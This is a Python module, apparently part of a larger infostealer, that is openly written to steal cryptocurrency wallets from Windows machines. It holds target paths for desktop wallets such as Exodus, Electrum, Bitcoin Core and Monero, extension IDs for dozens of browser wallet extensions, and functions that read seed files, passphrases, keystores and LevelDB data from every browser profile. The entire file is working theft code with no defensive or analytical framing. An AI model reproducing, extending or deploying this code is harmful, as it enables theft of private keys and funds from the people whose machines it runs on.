# modules/wallet_stealer.py - Cryptocurrency wallet theft
# Steals desktop wallets and browser extension wallets

import os
import json
import shutil
from pathlib import Path
from config import ROAMING, LOCAL, log

# Desktop wallet paths
DESKTOP_WALLETS = {
    # Multi-chain wallets
    'Exodus': ROAMING + '\\Exodus\\exodus.wallet',
    'AtomicWallet': ROAMING + '\\atomic\\Local Storage\\leveldb',
    'Jaxx': ROAMING + '\\com.liberty.jaxx\\IndexedDB',
    'Coinomi': LOCAL + '\\Coinomi\\Coinomi\\wallets',
    'Guarda': ROAMING + '\\Guarda\\Local Storage\\leveldb',
    
    # Bitcoin-family core wallets
    'Bitcoin': ROAMING + '\\Bitcoin\\wallets',
    'Litecoin': ROAMING + '\\Litecoin\\wallets',
    'Dash': ROAMING + '\\DashCore\\wallets',
    'Dogecoin': ROAMING + '\\Dogecoin\\wallets',
    
    # Electrum variants
    'Electrum': ROAMING + '\\Electrum\\wallets',
    'Electrum-LTC': ROAMING + '\\Electrum-LTC\\wallets',
    
    # Ethereum
    'Ethereum': ROAMING + '\\Ethereum\\keystore',
    
    # Privacy coins
    'Monero': os.getenv('USERPROFILE') + '\\Documents\\Monero\\wallets',
    'Zcash': ROAMING + '\\Zcash',
    'WasabiWallet': ROAMING + '\\WalletWasabi\\Client\\Wallets',
    
    # Other wallets
    'Armory': ROAMING + '\\Armory',
    'Bytecoin': ROAMING + '\\bytecoin',
    'Binance': ROAMING + '\\Binance',
}

# Browser extension wallet IDs (Chrome/Edge extension IDs)
EXTENSION_WALLETS = {
    # Major wallets
    'Metamask': ['nkbihfbeogaeaoehlefnkodbefgpgknn'],
    'TronLink': ['ibnejdfjmmkpcnlpebklmnkoeoihofec'],
    'BinanceChain': ['fhbohimaelbohpjbbldcngcnapndodjp'],
    'Coin98': ['aeachknmefphepccionboohckonoeemg'],
    'Phantom': ['bfnaelmomeimhlpmgjnjophhpkkoljpa'],
    'TrustWallet': ['egjidjbpglichdcondbcbdnbeeppgdph'],
    'CoinbaseWallet': ['hnfanknocfeofbddgcijnmhnfnkdnaad'],
    'Ronin': ['fnjhmkhhmkbjkkabndcnnogagogbneec'],
    'Exodus': ['aholpfdialjgjfhomihkjbmgjidlcdno'],
    'Brave': ['odbfpeeihdkbihmopkbjmoonfanlbfcl'],
    'Crypto.com': ['hifafgmccdpekplomjjkcfgodnhcellj'],
    'Keplr': ['dmkamcknogkgcdfhhbddcghachkejeap'],
    'Solflare': ['bhhhlbepdkbapadjdnnojkbgioiodbic'],
    'Slope': ['pocmplpaccanhmnllbbkpgfliimjljgo'],
    'Rabby': ['acmacodkjbdgmoleebolmdjonilkdbch'],
    'Braavos': ['jnlgamecbpmbajjfhmmmlhejkemejdma'],
    'OKX': ['mcohilncbfahbmgdjkbpemcciiolgcge'],
    'Sender': ['epapihdplajcdnnkdeiahlgigofloibg'],
    'Martian': ['efbglgofoippbgcjepnhiblaibcnclgk'],
    'Petra': ['ejjladinnckdgjemekebdpeokbikhfci'],
    'Pontem': ['phkbamefinggmakgklpkljjmgibohnba'],
    'Fewcha': ['ebfidpplhabeedpnhjnobghokpiioolj'],
    'Glow': ['ojbcfhjmpigfobfclfflafhblgemelio'],
    'Trezor': ['imloifkgjagghnncjkhggdhalmcnfklk'],
    'Ton': ['nphplpgoakhhjchkkhmiggakijnkhfnd'],
    'SubWallet': ['onhogfjeacnfoofkfgppdlbmlmnplgbn'],
    'Nami': ['lpfcbjknijpeeillifnkikgncikgfhdo'],
    'Eternl': ['kmhcihpebfmpgmihbkipmjlmmioameka'],
    'XDeFi': ['hmeobnfnfcmdkdcmlblgagmfpfboieaf'],
    'Safepal': ['lgmpcpglpngdoalbgeoldeajfclnhafa'],
    'BitKeep': ['jiidiaalihmmhddjgbnbgdfflelocpak'],
}

# Browser paths for extension data
BROWSER_PATHS = {
    'Chrome': LOCAL + '\\Google\\Chrome\\User Data',
    'Edge': LOCAL + '\\Microsoft\\Edge\\User Data',
    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data',
    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
    'OperaGX': ROAMING + '\\Opera Software\\Opera GX Stable',
    'Vivaldi': LOCAL + '\\Vivaldi\\User Data',
}

def find_browser_profiles(browser_path):
    """Find all browser profiles (Default, Profile 1, etc.)"""
    profiles = []
    
    default_profile = os.path.join(browser_path, 'Default')
    if os.path.exists(default_profile):
        profiles.append(default_profile)
    
    try:
        for item in os.listdir(browser_path):
            item_path = os.path.join(browser_path, item)
            if os.path.isdir(item_path) and item.startswith('Profile '):
                profiles.append(item_path)
    except:
        pass
    
    return profiles

def grab_exodus_files(wallet_path):
    """Grab Exodus wallet files (seed.seco, passphrase.json)"""
    files = {}
    
    targets = [
        'passphrase.json',
        'seed.seco',
        'info.seco',
        os.path.join('exodus.wallet', 'passphrase.json'),
        os.path.join('exodus.wallet', 'seed.seco'),
        os.path.join('exodus.wallet', 'info.seco'),
    ]
    
    for target in targets:
        full_path = os.path.join(wallet_path, target)
        if os.path.exists(full_path):
            try:
                with open(full_path, 'rb') as f:
                    files[target] = f.read()
            except:
                pass
    
    return files

def grab_electrum_files(wallet_path):
    """Grab Electrum wallet JSON files"""
    files = {}
    
    try:
        for item in os.listdir(wallet_path):
            item_path = os.path.join(wallet_path, item)
            if os.path.isfile(item_path):
                try:
                    with open(item_path, 'rb') as f:
                        content = f.read()
                    
                    # Electrum wallets are valid JSON
                    try:
                        json.loads(content.decode('utf-8', errors='ignore'))
                        files[item] = content
                    except:
                        pass
                except:
                    pass
    except:
        pass
    
    return files

def grab_keystore_files(wallet_path):
    """Grab Ethereum keystore files"""
    files = {}
    
    try:
        for item in os.listdir(wallet_path):
            if item.startswith('UTC--'):
                item_path = os.path.join(wallet_path, item)
                try:
                    with open(item_path, 'rb') as f:
                        files[item] = f.read()
                except:
                    pass
    except:
        pass
    
    return files

def grab_leveldb_files(wallet_path):
    """Grab LevelDB files (.ldb, .log, CURRENT, MANIFEST)"""
    files = {}
    
    try:
        for root, dirs, filenames in os.walk(wallet_path):
            for filename in filenames:
                ext = os.path.splitext(filename)[1].lower()
                if ext in ['.ldb', '.log'] or filename in ['CURRENT', 'MANIFEST']:
                    full_path = os.path.join(root, filename)
                    try:
                        with open(full_path, 'rb') as f:
                            rel_path = os.path.relpath(full_path, wallet_path)
                            files[rel_path] = f.read()
                    except:
                        pass
    except:
        pass
    
    return files

def grab_wallet_dat_files(wallet_path):
    """Grab wallet.dat files (Bitcoin Core, etc.)"""
    files = {}
    
    try:
        for root, dirs, filenames in os.walk(wallet_path):
            for filename in filenames:
                if filename == 'wallet.dat':
                    full_path = os.path.join(root, filename)
                    try:
                        with open(full_path, 'rb') as f:
                            rel_path = os.path.relpath(full_path, wallet_path)
                            files[rel_path] = f.read()
                    except:
                        pass
    except:
        pass
    
    return files

def grab_monero_files(wallet_path):
    """Grab Monero wallet files (.keys files)"""
    files = {}
    
    try:
        for root, dirs, filenames in os.walk(wallet_path):
            for filename in filenames:
                if filename.endswith('.keys') or ('wallet' in filename.lower() and not '.' in filename):
                    full_path = os.path.join(root, filename)
                    try:
                        with open(full_path, 'rb') as f:
                            rel_path = os.path.relpath(full_path, wallet_path)
                            files[rel_path] = f.read()
                    except:
                        pass
    except:
        pass
    
    return files

def grab_all_wallet_files(wallet_path, max_size=10*1024*1024):
    """Grab all files from wallet directory (max 10MB per file)"""
    files = {}
    
    try:
        for root, dirs, filenames in os.walk(wallet_path):
            for filename in filenames:
                full_path = os.path.join(root, filename)
                try:
                    file_size = os.path.getsize(full_path)
                    if file_size > max_size:
                        continue
                    
                    with open(full_path, 'rb') as f:
                        rel_path = os.path.relpath(full_path, wallet_path)
                        files[rel_path] = f.read()
                except:
                    pass
    except:
        pass
    
    return files

def steal_desktop_wallet(wallet_name, wallet_path):
    """Steal desktop wallet files"""
    if not os.path.exists(wallet_path):
        return None
    
    # Choose grabber based on wallet type
    if wallet_name == 'Exodus':
        files = grab_exodus_files(wallet_path)
    elif wallet_name in ['Electrum', 'Electrum-LTC']:
        files = grab_electrum_files(wallet_path)
    elif wallet_name == 'Ethereum':
        files = grab_keystore_files(wallet_path)
    elif wallet_name == 'AtomicWallet':
        files = grab_leveldb_files(wallet_path)
    elif wallet_name in ['Bitcoin', 'Litecoin', 'Dash', 'Dogecoin']:
        files = grab_wallet_dat_files(wallet_path)
    elif wallet_name == 'Monero':
        files = grab_monero_files(wallet_path)
    else:
        files = grab_all_wallet_files(wallet_path)
    
    if not files:
        return None
    
    log(f"Grabbed {len(files)} files from {wallet_name}")
    return files

def steal_extension_wallet(wallet_name, browser_name, ext_id, profile_path):
    """Steal browser extension wallet data"""
    ext_path = os.path.join(profile_path, 'Local Extension Settings', ext_id)
    
    if not os.path.exists(ext_path):
        return None
    
    files = grab_leveldb_files(ext_path)
    
    if not files:
        return None
    
    log(f"Grabbed {wallet_name} from {browser_name}")
    return files

def grab():
    """Main wallet stealing function"""
    log("Grabbing cryptocurrency wallets...")
    
    wallet_data = {
        'desktop': {},
        'extensions': {}
    }
    
    # Desktop wallets
    for wallet_name, wallet_path in DESKTOP_WALLETS.items():
        files = steal_desktop_wallet(wallet_name, wallet_path)
        if files:
            wallet_data['desktop'][wallet_name] = files
    
    # Browser extension wallets
    for browser_name, browser_path in BROWSER_PATHS.items():
        if not os.path.exists(browser_path):
            continue
        
        profiles = find_browser_profiles(browser_path)
        
        for profile_path in profiles:
            profile_name = os.path.basename(profile_path)
            
            for wallet_name, ext_ids in EXTENSION_WALLETS.items():
                for ext_id in ext_ids:
                    files = steal_extension_wallet(wallet_name, browser_name, ext_id, profile_path)
                    
                    if files:
                        key = f"{browser_name}_{profile_name}_{wallet_name}"
                        wallet_data['extensions'][key] = {
                            'browser': browser_name,
                            'profile': profile_name,
                            'wallet': wallet_name,
                            'files': files
                        }
    
    total_desktop = len(wallet_data['desktop'])
    total_extensions = len(wallet_data['extensions'])
    
    if total_desktop > 0 or total_extensions > 0:
        log(f"Found {total_desktop} desktop wallets, {total_extensions} extension wallets")
        return wallet_data
    
    return None